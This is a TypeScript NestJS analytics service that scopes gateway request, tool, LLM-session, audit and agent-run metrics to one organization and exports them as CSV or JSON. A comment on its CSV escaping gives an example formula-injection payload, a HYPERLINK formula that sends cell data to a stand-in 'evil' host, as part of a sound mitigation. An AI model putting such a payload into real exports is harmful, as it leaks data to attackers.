import { Injectable, Logger } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository, Between, LessThanOrEqual, MoreThanOrEqual } from 'typeorm';
import { RequestLog } from '../../entities/request-log.entity';
import { UsageMetric, MetricType } from '../../entities/usage-metric.entity';
import { ToolExecution } from '../../entities/tool-execution.entity';
import { LlmSession } from '../../entities/llm-session.entity';
import { LlmMessage } from '../../entities/llm-message.entity';
import { AuditLog } from '../../entities/audit-log.entity';
import { AgentRun } from '../../entities/agent-run.entity';

export interface RequestLogQuery {
  organizationId: string;
  page: number;
  limit: number;
  gatewayId?: string;
  toolId?: string;
  protocol?: string;
  statusFilter?: string;
  from?: Date;
  to?: Date;
}

export interface ExportQuery {
  organizationId: string;
  format: 'json' | 'csv';
  from?: Date;
  to?: Date;
  type: 'requests' | 'tool-executions' | 'llm-sessions';
}

@Injectable()
export class AnalyticsService {
  private readonly logger = new Logger(AnalyticsService.name);

  constructor(
    @InjectRepository(RequestLog)
    private readonly requestLogRepository: Repository<RequestLog>,
    @InjectRepository(UsageMetric)
    private readonly usageMetricRepository: Repository<UsageMetric>,
    @InjectRepository(ToolExecution)
    private readonly toolExecutionRepository: Repository<ToolExecution>,
    @InjectRepository(LlmSession)
    private readonly llmSessionRepository: Repository<LlmSession>,
    @InjectRepository(LlmMessage)
    private readonly llmMessageRepository: Repository<LlmMessage>,
    @InjectRepository(AuditLog)
    private readonly auditLogRepository: Repository<AuditLog>,
    @InjectRepository(AgentRun)
    private readonly agentRunRepository: Repository<AgentRun>,
  ) {}

  async getOverview(organizationId: string) {
    if (!organizationId) {
      throw new Error('getOverview requires organizationId');
    }

    const now = new Date();
    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    const last7d = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);

    // RequestLog has no direct organizationId column — scope via the
    // gateway join, same pattern as getRequestLogs(). Before this the
    // dashboard's overview tiles (request count, avg response time,
    // error count) were GLOBAL across every org.
    const [
      totalRequests24h,
      totalRequests7d,
      totalToolExecs24h,
      totalToolExecs7d,
      avgResponseTime24h,
      errorCount24h,
      llmSessions24h,
      llmCost7d,
    ] = await Promise.all([
      // Only count protocol requests (MCP, UTCP, A2A, Skills), not internal management API calls
      this.requestLogRepository
        .createQueryBuilder('log')
        .innerJoin('log.gateway', 'gw')
        .where('gw.organizationId = :orgId', { orgId: organizationId })
        .andWhere('log.timestamp >= :since', { since: last24h })
        .andWhere("log.metadata->>'protocol' IS NOT NULL")
        .getCount()
        .catch(() => 0),
      this.requestLogRepository
        .createQueryBuilder('log')
        .innerJoin('log.gateway', 'gw')
        .where('gw.organizationId = :orgId', { orgId: organizationId })
        .andWhere('log.timestamp >= :since', { since: last7d })
        .andWhere("log.metadata->>'protocol' IS NOT NULL")
        .getCount()
        .catch(() => 0),
      this.toolExecutionRepository.count({
        where: { organizationId, createdAt: MoreThanOrEqual(last24h) },
      }).catch(() => 0),
      this.toolExecutionRepository.count({
        where: { organizationId, createdAt: MoreThanOrEqual(last7d) },
      }).catch(() => 0),
      this.requestLogRepository
        .createQueryBuilder('log')
        .innerJoin('log.gateway', 'gw')
        .select('AVG(log.responseTime)', 'avg')
        .where('gw.organizationId = :orgId', { orgId: organizationId })
        .andWhere('log.timestamp >= :since', { since: last24h })
        .andWhere("log.metadata->>'protocol' IS NOT NULL")
        .getRawOne()
        .then(r => Math.round(r?.avg || 0))
        .catch(() => 0),
      this.requestLogRepository
        .createQueryBuilder('log')
        .innerJoin('log.gateway', 'gw')
        .where('gw.organizationId = :orgId', { orgId: organizationId })
        .andWhere('log.timestamp >= :since', { since: last24h })
        .andWhere('log.statusCode >= 500')
        .andWhere("log.metadata->>'protocol' IS NOT NULL")
        .getCount()
        .catch(() => 0),
      this.llmSessionRepository.count({
        where: { organizationId, createdAt: MoreThanOrEqual(last24h) },
      }).catch(() => 0),
      this.llmSessionRepository
        .createQueryBuilder('session')
        .select('SUM(session.totalCost)', 'total')
        .where('session.organizationId = :orgId', { orgId: organizationId })
        .andWhere('session.createdAt >= :since', { since: last7d })
        .getRawOne()
        .then(r => parseFloat(r?.total || '0'))
        .catch(() => 0),
    ]);

    return {
      last24h: {
        requests: totalRequests24h,
        toolExecutions: totalToolExecs24h,
        avgResponseTime: avgResponseTime24h,
        errors: errorCount24h,
        llmSessions: llmSessions24h,
      },
      last7d: {
        requests: totalRequests7d,
        toolExecutions: totalToolExecs7d,
        llmCostCents: Math.round(llmCost7d * 100) / 100,
      },
    };
  }

  async getRequestLogs(query: RequestLogQuery) {
    // CRITICAL: RequestLog has no direct `organizationId` column — the
    // only link is via its `gateway` relation. The previous query was
    // unscoped, so any authenticated caller could see every request
    // log in the database across every organization.
    //
    // Scope via INNER JOIN on gateway so a request log only shows up
    // for members of the gateway's org. A request log with no
    // associated gateway (system-level / health-check traffic) is
    // never returned through this endpoint.
    if (!query.organizationId) {
      throw new Error('getRequestLogs requires organizationId');
    }
    const qb = this.requestLogRepository
      .createQueryBuilder('log')
      .innerJoin('log.gateway', 'gw')
      .andWhere('gw.organizationId = :orgId', { orgId: query.organizationId })
      .orderBy('log.timestamp', 'DESC')
      .skip((query.page - 1) * query.limit)
      .take(query.limit);

    if (query.gatewayId) {
      qb.andWhere('log.gatewayId = :gatewayId', { gatewayId: query.gatewayId });
    }
    if (query.toolId) {
      qb.andWhere('log.toolId = :toolId', { toolId: query.toolId });
    }
    if (query.protocol) {
      qb.andWhere("log.metadata->>'protocol' = :protocol", { protocol: query.protocol });
    }
    if (query.statusFilter === 'error') {
      qb.andWhere('log.statusCode >= 400');
    } else if (query.statusFilter === 'success') {
      qb.andWhere('log.statusCode < 400');
    }
    if (query.from) {
      qb.andWhere('log.timestamp >= :from', { from: query.from });
    }
    if (query.to) {
      qb.andWhere('log.timestamp <= :to', { to: query.to });
    }

    const [logs, total] = await qb.getManyAndCount();

    return {
      data: logs.map(log => ({
        id: log.id,
        method: log.method,
        path: log.path,
        statusCode: log.statusCode,
        responseTime: log.responseTime,
        protocol: (log.metadata as any)?.protocol || null,
        gatewayId: log.gatewayId,
        toolId: log.toolId,
        userId: log.userId,
        userAgent: log.userAgent,
        ipAddress: log.ipAddress,
        errorMessage: log.errorMessage,
        requestSize: log.requestSize,
        responseSize: log.responseSize,
        timestamp: log.timestamp,
      })),
      total,
      page: query.page,
      pages: Math.ceil(total / query.limit),
    };
  }

  async getToolUsage(organizationId: string, timeframe: string) {
    const since = this.getTimeframeDate(timeframe);

    const results = await this.toolExecutionRepository
      .createQueryBuilder('exec')
      .select('exec.toolId', 'toolId')
      .addSelect('COUNT(*)', 'totalExecutions')
      .addSelect('SUM(CASE WHEN exec.success = true THEN 1 ELSE 0 END)', 'successCount')
      .addSelect('AVG(exec.executionTime)', 'avgExecutionTime')
      .addSelect('MAX(exec.createdAt)', 'lastUsed')
      .where('exec.organizationId = :orgId', { orgId: organizationId })
      .andWhere('exec.createdAt >= :since', { since })
      .groupBy('exec.toolId')
      .orderBy('COUNT(*)', 'DESC')
      .getRawMany();

    return results.map(r => ({
      toolId: r.toolId,
      totalExecutions: parseInt(r.totalExecutions, 10),
      successCount: parseInt(r.successCount, 10),
      successRate: r.totalExecutions > 0
        ? Math.round((parseInt(r.successCount, 10) / parseInt(r.totalExecutions, 10)) * 100)
        : 0,
      avgExecutionTime: Math.round(parseFloat(r.avgExecutionTime) || 0),
      lastUsed: r.lastUsed,
    }));
  }

  async getGatewayUsage(organizationId: string, timeframe: string) {
    if (!organizationId) {
      throw new Error('getGatewayUsage requires organizationId');
    }
    const since = this.getTimeframeDate(timeframe);

    // CRITICAL: previously this method took organizationId as a
    // parameter and never used it. Every authenticated user got every
    // org's per-gateway usage counts back. Scope by metric.organizationId
    // (which is indexed on (organizationId, timestamp)).
    const results = await this.usageMetricRepository
      .createQueryBuilder('metric')
      .select('metric.gatewayId', 'gatewayId')
      .addSelect('COUNT(*)', 'totalRequests')
      .addSelect("SUM(CASE WHEN metric.status = 'success' THEN 1 ELSE 0 END)", 'successCount')
      .addSelect("SUM(CASE WHEN metric.status = 'error' THEN 1 ELSE 0 END)", 'errorCount')
      .where('metric.organizationId = :orgId', { orgId: organizationId })
      .andWhere('metric.type = :type', { type: MetricType.REQUEST_COUNT })
      .andWhere('metric.gatewayId IS NOT NULL')
      .andWhere('metric.timestamp >= :since', { since })
      .groupBy('metric.gatewayId')
      .orderBy('COUNT(*)', 'DESC')
      .getRawMany();

    return results.map(r => ({
      gatewayId: r.gatewayId,
      totalRequests: parseInt(r.totalRequests, 10),
      successCount: parseInt(r.successCount, 10),
      errorCount: parseInt(r.errorCount, 10),
      successRate: r.totalRequests > 0
        ? Math.round((parseInt(r.successCount, 10) / parseInt(r.totalRequests, 10)) * 100)
        : 0,
    }));
  }

  async getLlmUsage(organizationId: string, timeframe: string) {
    const since = this.getTimeframeDate(timeframe);

    const sessions = await this.llmSessionRepository
      .createQueryBuilder('session')
      .select('session.providerId', 'providerId')
      .addSelect('COUNT(*)', 'sessionCount')
      .addSelect('SUM(session.messageCount)', 'totalMessages')
      .addSelect('SUM(session.totalInputTokens)', 'totalInputTokens')
      .addSelect('SUM(session.totalOutputTokens)', 'totalOutputTokens')
      .addSelect('SUM(session.totalCost)', 'totalCostCents')
      .addSelect('SUM(session.toolCalls)', 'totalToolCalls')
      .where('session.organizationId = :orgId', { orgId: organizationId })
      .andWhere('session.createdAt >= :since', { since })
      .groupBy('session.providerId')
      .getRawMany();

    return sessions.map(s => ({
      providerId: s.providerId,
      sessionCount: parseInt(s.sessionCount, 10),
      totalMessages: parseInt(s.totalMessages, 10),
      totalInputTokens: parseInt(s.totalInputTokens, 10),
      totalOutputTokens: parseInt(s.totalOutputTokens, 10),
      totalCostCents: Math.round(parseFloat(s.totalCostCents) * 100) / 100,
      totalToolCalls: parseInt(s.totalToolCalls, 10),
    }));
  }

  async getTimeline(organizationId: string, timeframe: string, granularity: string) {
    if (!organizationId) {
      throw new Error('getTimeline requires organizationId');
    }
    const since = this.getTimeframeDate(timeframe);
    const truncInterval = granularity === 'minute' ? 'minute' :
                          granularity === 'hour' ? 'hour' :
                          granularity === 'day' ? 'day' : 'hour';

    const results = await this.requestLogRepository
      .createQueryBuilder('log')
      .innerJoin('log.gateway', 'gw')
      .select(`date_trunc('${truncInterval}', log.timestamp)`, 'bucket')
      .addSelect('COUNT(*)', 'requests')
      .addSelect('SUM(CASE WHEN log.statusCode >= 400 THEN 1 ELSE 0 END)', 'errors')
      .addSelect('AVG(log.responseTime)', 'avgResponseTime')
      .where('gw.organizationId = :orgId', { orgId: organizationId })
      .andWhere('log.timestamp >= :since', { since })
      .andWhere("log.metadata->>'protocol' IS NOT NULL")
      .groupBy('bucket')
      .orderBy('bucket', 'ASC')
      .getRawMany();

    return results.map(r => ({
      timestamp: r.bucket,
      requests: parseInt(r.requests, 10),
      errors: parseInt(r.errors, 10),
      avgResponseTime: Math.round(parseFloat(r.avgResponseTime) || 0),
    }));
  }

  async getAuditSummary(organizationId: string) {
    const now = new Date();
    const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    const weekStart = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
    const monthStart = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);

    const [
      totalToday,
      totalWeek,
      totalMonth,
      byResourceType,
      byAction,
      topUsers,
      hourlyTimeline,
    ] = await Promise.all([
      this.auditLogRepository.count({
        where: { organizationId, createdAt: MoreThanOrEqual(todayStart) },
      }).catch(() => 0),
      this.auditLogRepository.count({
        where: { organizationId, createdAt: MoreThanOrEqual(weekStart) },
      }).catch(() => 0),
      this.auditLogRepository.count({
        where: { organizationId, createdAt: MoreThanOrEqual(monthStart) },
      }).catch(() => 0),
      this.auditLogRepository
        .createQueryBuilder('audit')
        .select('audit.resourceType', 'resourceType')
        .addSelect('COUNT(*)', 'count')
        .where('audit.organizationId = :orgId', { orgId: organizationId })
        .andWhere('audit.createdAt >= :since', { since: monthStart })
        .groupBy('audit.resourceType')
        .orderBy('COUNT(*)', 'DESC')
        .getRawMany()
        .catch(() => []),
      this.auditLogRepository
        .createQueryBuilder('audit')
        .select('audit.action', 'action')
        .addSelect('COUNT(*)', 'count')
        .where('audit.organizationId = :orgId', { orgId: organizationId })
        .andWhere('audit.createdAt >= :since', { since: monthStart })
        .groupBy('audit.action')
        .orderBy('COUNT(*)', 'DESC')
        .getRawMany()
        .catch(() => []),
      this.auditLogRepository
        .createQueryBuilder('audit')
        .select('audit.userEmail', 'userEmail')
        .addSelect('audit.userId', 'userId')
        .addSelect('COUNT(*)', 'count')
        .where('audit.organizationId = :orgId', { orgId: organizationId })
        .andWhere('audit.createdAt >= :since', { since: monthStart })
        .andWhere('audit.userId IS NOT NULL')
        .groupBy('audit.userEmail')
        .addGroupBy('audit.userId')
        .orderBy('COUNT(*)', 'DESC')
        .limit(10)
        .getRawMany()
        .catch(() => []),
      this.auditLogRepository
        .createQueryBuilder('audit')
        .select("date_trunc('hour', audit.createdAt)", 'bucket')
        .addSelect('COUNT(*)', 'count')
        .where('audit.organizationId = :orgId', { orgId: organizationId })
        .andWhere('audit.createdAt >= :since', { since: last24h })
        .groupBy('bucket')
        .orderBy('bucket', 'ASC')
        .getRawMany()
        .catch(() => []),
    ]);

    return {
      totals: {
        today: totalToday,
        thisWeek: totalWeek,
        thisMonth: totalMonth,
      },
      byResourceType: byResourceType.map(r => ({
        resourceType: r.resourceType,
        count: parseInt(r.count, 10),
      })),
      byAction: byAction.map(r => ({
        action: r.action,
        count: parseInt(r.count, 10),
      })),
      topUsers: topUsers.map(r => ({
        userId: r.userId,
        userEmail: r.userEmail,
        count: parseInt(r.count, 10),
      })),
      timeline: hourlyTimeline.map(r => ({
        timestamp: r.bucket,
        count: parseInt(r.count, 10),
      })),
    };
  }

  async getAgentRunsSummary(organizationId: string) {
    const now = new Date();
    const last7d = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);

    const [
      totalRuns,
      completedRuns,
      failedRuns,
      cancelledRuns,
      avgDuration,
      totalCost,
      runsByAgent,
      runsTimeline,
    ] = await Promise.all([
      this.agentRunRepository.count({
        where: { organizationId, createdAt: MoreThanOrEqual(last7d) },
      }).catch(() => 0),
      this.agentRunRepository.count({
        where: { organizationId, status: 'completed' as any, createdAt: MoreThanOrEqual(last7d) },
      }).catch(() => 0),
      this.agentRunRepository.count({
        where: { organizationId, status: 'failed' as any, createdAt: MoreThanOrEqual(last7d) },
      }).catch(() => 0),
      this.agentRunRepository.count({
        where: { organizationId, status: 'cancelled' as any, createdAt: MoreThanOrEqual(last7d) },
      }).catch(() => 0),
      this.agentRunRepository
        .createQueryBuilder('run')
        .select('AVG(run.executionTime)', 'avg')
        .where('run.organizationId = :orgId', { orgId: organizationId })
        .andWhere('run.createdAt >= :since', { since: last7d })
        .andWhere('run.executionTime > 0')
        .getRawOne()
        .then(r => Math.round(parseFloat(r?.avg || '0')))
        .catch(() => 0),
      this.agentRunRepository
        .createQueryBuilder('run')
        .select('SUM(run.totalCost)', 'total')
        .where('run.organizationId = :orgId', { orgId: organizationId })
        .andWhere('run.createdAt >= :since', { since: last7d })
        .getRawOne()
        .then(r => parseFloat(r?.total || '0'))
        .catch(() => 0),
      this.agentRunRepository
        .createQueryBuilder('run')
        .select('run.agentId', 'agentId')
        .addSelect('COUNT(*)', 'count')
        .addSelect("SUM(CASE WHEN run.status = 'completed' THEN 1 ELSE 0 END)", 'completed')
        .addSelect("SUM(CASE WHEN run.status = 'failed' THEN 1 ELSE 0 END)", 'failed')
        .addSelect('AVG(run.executionTime)', 'avgDuration')
        .addSelect('SUM(run.totalCost)', 'cost')
        .where('run.organizationId = :orgId', { orgId: organizationId })
        .andWhere('run.createdAt >= :since', { since: last7d })
        .groupBy('run.agentId')
        .orderBy('COUNT(*)', 'DESC')
        .limit(20)
        .getRawMany()
        .catch(() => []),
      this.agentRunRepository
        .createQueryBuilder('run')
        .select("date_trunc('day', run.createdAt)", 'bucket')
        .addSelect('COUNT(*)', 'count')
        .addSelect("SUM(CASE WHEN run.status = 'completed' THEN 1 ELSE 0 END)", 'completed')
        .addSelect("SUM(CASE WHEN run.status = 'failed' THEN 1 ELSE 0 END)", 'failed')
        .where('run.organizationId = :orgId', { orgId: organizationId })
        .andWhere('run.createdAt >= :since', { since: last7d })
        .groupBy('bucket')
        .orderBy('bucket', 'ASC')
        .getRawMany()
        .catch(() => []),
    ]);

    return {
      totals: {
        total: totalRuns,
        completed: completedRuns,
        failed: failedRuns,
        cancelled: cancelledRuns,
      },
      avgDuration,
      totalCost: Math.round(totalCost * 10000) / 10000,
      byAgent: runsByAgent.map(r => ({
        agentId: r.agentId,
        count: parseInt(r.count, 10),
        completed: parseInt(r.completed, 10),
        failed: parseInt(r.failed, 10),
        avgDuration: Math.round(parseFloat(r.avgDuration || '0')),
        cost: parseFloat(r.cost || '0'),
      })),
      timeline: runsTimeline.map(r => ({
        timestamp: r.bucket,
        count: parseInt(r.count, 10),
        completed: parseInt(r.completed, 10),
        failed: parseInt(r.failed, 10),
      })),
    };
  }

  async exportData(query: ExportQuery): Promise<any> {
    // Every export type MUST be org-scoped. Without this, an
    // authenticated user could download every request log / tool
    // execution / LLM session across every org in the database.
    if (!query.organizationId) {
      throw new Error('exportData requires organizationId');
    }
    const from = query.from || new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
    const to = query.to || new Date();

    if (query.type === 'requests') {
      // Same JOIN-via-gateway scoping as getRequestLogs, because
      // RequestLog has no direct organizationId column. Use a
      // query builder instead of the repository's find() so we can
      // add the inner join cleanly.
      const logs = await this.requestLogRepository
        .createQueryBuilder('log')
        .innerJoin('log.gateway', 'gw')
        .where('gw.organizationId = :orgId', { orgId: query.organizationId })
        .andWhere('log.timestamp BETWEEN :from AND :to', { from, to })
        .orderBy('log.timestamp', 'DESC')
        .take(10000)
        .getMany();

      if (query.format === 'csv') {
        return this.toCsv(logs, [
          'id', 'method', 'path', 'statusCode', 'responseTime',
          'userAgent', 'ipAddress', 'gatewayId', 'toolId', 'userId',
          'errorMessage', 'requestSize', 'responseSize', 'timestamp',
        ]);
      }
      return logs;
    }

    if (query.type === 'tool-executions') {
      const execs = await this.toolExecutionRepository.find({
        where: {
          organizationId: query.organizationId,
          createdAt: Between(from, to),
        },
        order: { createdAt: 'DESC' },
        take: 10000,
      });

      if (query.format === 'csv') {
        return this.toCsv(execs, [
          'id', 'toolId', 'userId', 'organizationId', 'success',
          'executionTime', 'cached', 'retryCount', 'error', 'createdAt',
        ]);
      }
      return execs;
    }

    if (query.type === 'llm-sessions') {
      const sessions = await this.llmSessionRepository.find({
        where: {
          organizationId: query.organizationId,
          createdAt: Between(from, to),
        },
        order: { createdAt: 'DESC' },
        take: 10000,
      });

      if (query.format === 'csv') {
        return this.toCsv(sessions, [
          'id', 'providerId', 'type', 'status', 'messageCount',
          'totalInputTokens', 'totalOutputTokens', 'totalCost',
          'toolCalls', 'successfulToolCalls', 'createdAt', 'completedAt',
        ]);
      }
      return sessions;
    }

    return [];
  }

  private toCsv(data: any[], columns: string[]): string {
    const header = columns.join(',');
    const rows = data.map(item =>
      columns.map(col => this.escapeCsvCell(item[col])).join(','),
    );
    return [header, ...rows].join('\n');
  }

  /**
   * Escape a CSV cell value. Handles two separate concerns:
   *
   *   1. Syntax quoting (the standard RFC 4180 rule): wrap in double
   *      quotes and double any embedded quotes when the cell contains
   *      `,`, `"`, `\r`, or `\n`.
   *
   *   2. Formula injection mitigation: a cell whose first character is
   *      `=`, `+`, `-`, `@`, `\t`, or `\r` will be interpreted as a
   *      formula by Excel / LibreOffice Calc / Google Sheets when the
   *      CSV is opened. An attacker could craft a tool name like
   *      `=HYPERLINK("http://evil/?"&A1,"click")` and steal another
   *      cell's value when an admin exports the CSV. We prepend a
   *      single quote (`'`) to any such cell. This is the standard
   *      OWASP mitigation for CSV injection.
   */
  private escapeCsvCell(val: any): string {
    if (val === null || val === undefined) return '';
    let str = String(val);

    // Formula-injection mitigation BEFORE syntax quoting.
    if (str.length > 0 && /^[=+\-@\t\r]/.test(str)) {
      str = `'${str}`;
    }

    if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
      return `"${str.replace(/"/g, '""')}"`;
    }
    return str;
  }

  private getTimeframeDate(timeframe: string): Date {
    const now = new Date();
    const match = timeframe.match(/^(\d+)(h|d|w|m)$/);
    if (!match) return new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);

    const value = parseInt(match[1], 10);
    const unit = match[2];

    switch (unit) {
      case 'h': return new Date(now.getTime() - value * 60 * 60 * 1000);
      case 'd': return new Date(now.getTime() - value * 24 * 60 * 60 * 1000);
      case 'w': return new Date(now.getTime() - value * 7 * 24 * 60 * 60 * 1000);
      case 'm': return new Date(now.getTime() - value * 30 * 24 * 60 * 60 * 1000);
      default: return new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
    }
  }
}
